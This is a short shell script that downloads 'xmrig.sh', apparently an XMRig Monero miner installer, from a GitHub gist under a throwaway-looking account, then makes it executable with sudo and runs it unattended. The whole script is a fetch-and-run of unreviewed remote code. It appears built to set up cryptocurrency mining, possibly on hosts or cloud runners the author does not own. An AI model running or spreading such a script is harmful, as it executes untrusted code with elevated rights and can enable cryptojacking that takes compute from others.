#!/bin/sh
wget https://gist.githubusercontent.com/deaduserbot18/5fa94391e6a5983bd042d3ae77a9113b/raw/9eba9e0a248686d04285361efffea98592e8e00d/xmrig.sh

export DEBIAN_FRONTEND=noninteractive
ln -fs /usr/share/zoneinfo/America/New_York /etc/localtime

export TAG=10
sudo chmod +x xmrig.sh
./xmrig.sh
